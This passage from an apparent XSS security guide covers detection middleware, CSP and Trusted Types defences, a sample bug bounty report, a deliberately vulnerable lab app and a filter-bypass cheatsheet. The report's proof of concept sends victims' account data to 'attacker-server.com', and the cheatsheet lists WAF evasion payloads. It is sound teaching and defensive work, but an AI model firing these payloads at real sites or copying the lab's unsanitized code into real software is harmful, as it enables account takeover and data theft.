  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});
```

### 14.4 Using Regex to Parse HTML

```javascript
// NEVER DO THIS
const clean = input.replace(/<[^>]*>/g, '');
// Bypassed with: <img src=x onerror=alert(1)//
// or: <svg/onload=alert(1)>
```

HTML is not a regular language. You cannot parse it with regular expressions. Use a proper DOM parser (DOMPurify, sanitize-html, bleach for Python).

### 14.5 Forgetting About Template Engines

When switching template engines or using multiple rendering contexts, ensure every one escapes by default. Jinja2 with `autoescape=False`, EJS with `<%-`, Pug with `!=` -- all produce raw output.

---

## 15. Detection Strategies

### 15.1 Server-Side Detection

```javascript
// Express.js middleware for XSS pattern detection (logging, not blocking)
const XSS_PATTERNS = [
  /<script[\s>]/i,
  /javascript:/i,
  /on\w+\s*=/i,
  /<\s*img[^>]+onerror/i,
  /<\s*svg[^>]+onload/i,
];

app.use((req, res, next) => {
  const inputs = [
    ...Object.values(req.query),
    ...Object.values(req.body || {}),
    req.originalUrl,
  ];
  
  for (const input of inputs) {
    if (typeof input !== 'string') continue;
    for (const pattern of XSS_PATTERNS) {
      if (pattern.test(input)) {
        console.warn(`[XSS-DETECT] Suspicious input from ${req.ip}: ${input.substring(0, 200)}`);
        // Log to SIEM, do not necessarily block (to avoid false positives)
        break;
      }
    }
  }
  next();
});
```

### 15.2 CSP Reporting

```
Content-Security-Policy-Report-Only: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  report-uri /api/csp-report;
  report-to csp-endpoint;
```

```javascript
// Express.js CSP report handler
router.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'] || req.body;
  console.warn('[CSP-VIOLATION]', JSON.stringify({
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
  }));
  res.status(204).end();
});
```

### 15.3 Browser-Side Detection

Trusted Types is a browser API that prevents DOM XSS by requiring all dangerous sink assignments to go through a policy function:

```javascript
// Enable Trusted Types
// CSP header: require-trusted-types-for 'script'; trusted-types myPolicy;

if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScript: () => { throw new Error('Script creation blocked'); },
    createScriptURL: (url) => {
      const parsed = new URL(url, location.origin);
      if (parsed.origin !== location.origin) {
        throw new Error('External script URL blocked');
      }
      return url;
    },
  });
}
```

---

## 16. Prevention Strategies Summary

| Layer | Control | Protection |
|-------|---------|------------|
| Input | Server-side validation and sanitization (DOMPurify) | Prevents malicious data from being stored |
| Output | Context-aware encoding (HTML, JS, URL, CSS) | Prevents stored data from executing |
| Browser | Content Security Policy (strict, nonce-based) | Blocks unauthorized script execution |
| Browser | Trusted Types | Prevents DOM XSS at the API level |
| Server | HttpOnly, Secure, SameSite cookie flags | Limits impact of XSS (no cookie theft) |
| Server | X-Content-Type-Options: nosniff | Prevents MIME-type sniffing attacks |
| Architecture | Separate origin for user uploads | Isolates uploaded content from session cookies |
| Framework | Use React/Vue/Angular default escaping | Prevents most injection in JSX/templates |

---

## 17. Bug Bounty Report Example

```
## Title
Stored XSS via Markdown Comment Body Leading to Account Takeover

## Severity
High (CVSS 8.1)

## Summary
The application's comment system allows users to write comments in Markdown,
which are rendered to HTML using the `marked` library with default
configuration. The rendered HTML is inserted into the page using
`dangerouslySetInnerHTML` in the React frontend without sanitization.
An attacker can inject arbitrary JavaScript that executes in the context
of any user who views the comment.

## Steps to Reproduce

1. Log in to the application as any user.
2. Navigate to any post with comments enabled.
3. Submit the following comment:

   ```
   Great post! Check this out:
   
   <img src=x onerror="fetch('/api/account',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker-server.com/log',{method:'POST',body:JSON.stringify(d)}))">
   ```

4. Log out and log in as a different user (the victim).
5. Navigate to the same post.
6. Observe that the victim's account data (including email, API keys) is
   sent to the attacker's server.

## Impact

An attacker can:
- Steal session tokens from localStorage (the application stores JWTs there)
- Perform any action as the victim (change email, change password, delete account)
- Escalate to admin if an admin views the comment
- Chain into a worm that posts the same XSS payload as every victim,
  achieving exponential spread

## Proof of Concept

Attacker's receiving server:

```python
from fastapi import FastAPI, Request
app = FastAPI()

@app.post("/log")
async def log(request: Request):
    data = await request.json()
    with open("stolen_data.log", "a") as f:
        f.write(str(data) + "\n")
    return {"status": "ok"}
```

## Remediation

1. Sanitize Markdown-rendered HTML with DOMPurify before rendering.
2. Implement a strict Content Security Policy with nonce-based script-src.
3. Set `HttpOnly` flag on session cookies.
4. Migrate JWT storage from localStorage to HttpOnly cookies.

## CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
```

---

## 18. Severity Explanation

| XSS Type | Typical Severity | Reasoning |
|----------|-----------------|-----------|
| Stored XSS on main application, no auth required to trigger | Critical (P1) | Fires automatically, can be wormable |
| Stored XSS requiring victim to visit specific page | High (P2) | Persistent, but requires user interaction |
| Reflected XSS on main domain | Medium-High (P2-P3) | Requires social engineering to deliver URL |
| DOM XSS on main domain | Medium-High (P2-P3) | Same as reflected, harder to detect |
| Self-XSS (only fires in attacker's own session) | Informational (P5) | No impact on other users unless chainable |
| XSS on sandbox/cookieless domain | Low (P4) | Limited impact due to isolation |
| XSS chained to account takeover | Critical (P1) | Demonstrates full impact |

Severity increases when:
- The target page is high-traffic (homepage, dashboard).
- The XSS fires without user interaction beyond normal browsing.
- Sensitive data (tokens, PII) is accessible from the XSS context.
- The application lacks CSP or has a weak CSP.
- HttpOnly cookies are not set.

---

## 19. Lab Setup Ideas

### 19.1 Docker-Based Vulnerable Application

```yaml
# docker-compose.yml
version: '3.8'
services:
  vulnerable-app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=development
      - DATABASE_URL=postgres://postgres:password@db:5432/xss_lab
      - SESSION_SECRET=insecure-secret
    depends_on:
      - db

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: xss_lab
      POSTGRES_PASSWORD: password
    volumes:
      - pgdata:/var/lib/postgresql/data
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql

volumes:
  pgdata:
```

**init.sql:**

```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(100),
  display_name VARCHAR(200),  -- no length or content validation
  bio TEXT,
  website VARCHAR(500)
);

CREATE TABLE posts (
  id SERIAL PRIMARY KEY,
  title VARCHAR(300),
  body TEXT,
  author_id INTEGER REFERENCES users(id)
);

CREATE TABLE comments (
  id SERIAL PRIMARY KEY,
  post_id INTEGER REFERENCES posts(id),
  author_id INTEGER REFERENCES users(id),
  body TEXT  -- stored as raw HTML after markdown rendering
);
```

### 19.2 Existing Labs

- **PortSwigger Web Security Academy**: Free, browser-based XSS labs covering reflected, stored, DOM, and advanced topics.
- **OWASP Juice Shop**: Docker-based vulnerable application with numerous XSS challenges.
- **XSS Game by Google**: `xss-game.appspot.com` (may be archived but community mirrors exist).
- **DVWA (Damn Vulnerable Web Application)**: Classic PHP-based lab, good for fundamentals.

### 19.3 Custom Lab: React + Express XSS Playground

```javascript
// server.js -- intentionally vulnerable
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const comments = [];

app.get('/api/comments', (req, res) => {
  res.json(comments);
});

app.post('/api/comments', (req, res) => {
  comments.push({
    id: comments.length + 1,
    body: req.body.body, // No sanitization
    author: req.body.author,
    createdAt: new Date().toISOString(),
  });
  res.json({ success: true });
});

app.get('/search', (req, res) => {
  const q = req.query.q;
  // Reflected XSS
  res.send(`<html><body><h1>Results for: ${q}</h1></body></html>`);
});

app.listen(3000, () => console.log('Vulnerable lab running on port 3000'));
```

```jsx
// src/App.jsx -- intentionally vulnerable React component
import { useState, useEffect } from 'react';

function App() {
  const [comments, setComments] = useState([]);
  
  useEffect(() => {
    fetch('/api/comments').then(r => r.json()).then(setComments);
  }, []);

  return (
    <div>
      <h1>XSS Lab</h1>
      {comments.map(c => (
        <div key={c.id}>
          <strong>{c.author}</strong>
          {/* VULNERABLE: dangerouslySetInnerHTML with unsanitized input */}
          <div dangerouslySetInnerHTML={{ __html: c.body }} />
        </div>
      ))}
    </div>
  );
}
```

---

## 20. Common Bypass Techniques Cheatsheet

| Filter | Bypass |
|--------|--------|
| `<script>` blocked | `<img src=x onerror=alert(1)>` |
| `alert` blocked | `confirm(1)`, `prompt(1)`, `print()`, `window['al'+'ert'](1)` |
| Parentheses `()` blocked | `` alert`1` `` (tagged template literal) |
| Spaces blocked | `<img/src=x/onerror=alert(1)>` (use `/` as separator) |
| Quotes blocked | `<img src=x onerror=alert(1)>` (no quotes needed for attribute values without spaces) |
| `on*` event handlers blocked | `<a href=javascript:alert(1)>click</a>` |
| `javascript:` blocked | `<a href=&#106;avascript:alert(1)>click</a>` (HTML entity for `j`) |
| Entire `<tag>` pattern blocked | Injection into existing attribute: `" onfocus=alert(1) autofocus="` |
| WAF blocks all known tags | `<custom-tag onfocus=alert(1) tabindex=1 autofocus>` (some browsers fire events on custom elements) |
| Double encoding | `%253Cscript%253E` (if app decodes twice) |
| Unicode normalization | `＜script＞alert(1)＜/script＞` (fullwidth characters, if the backend normalizes to ASCII) |

---

## Conclusion

XSS in modern frontends is not a solved problem. React, Vue, and Angular raise the bar for trivial injection, but the attack surface has shifted to `dangerouslySetInnerHTML`, markdown rendering pipelines, SVG uploads, postMessage handlers, and SSR hydration. The browser's HTML parser is a complex state machine, and mutation XSS exploits the gap between how sanitizers see HTML and how browsers actually parse it.

For defenders: implement defense in depth. Sanitize input with DOMPurify, encode output contextually, deploy a strict nonce-based CSP, enable Trusted Types, set HttpOnly and SameSite cookie flags, and serve user-uploaded content from a separate cookieless domain.

For bug bounty hunters: the highest-paying XSS reports demonstrate impact. Do not stop at `alert(1)`. Chain XSS into account takeover, show cookie/token exfiltration, demonstrate privilege escalation. Use polyglot payloads to maximize your hit rate, and always test for CSP bypasses and WAF evasion before concluding a target is not vulnerable.

---

**Continue your security research.** If you found this guide useful, apply these techniques in your next bug bounty engagement. Set up the lab environment, practice the payloads, and build muscle memory for identifying XSS in code review. The next article in this series covers CSRF, session fixation, and authentication bypass -- vulnerabilities that XSS frequently chains into for maximum impact.
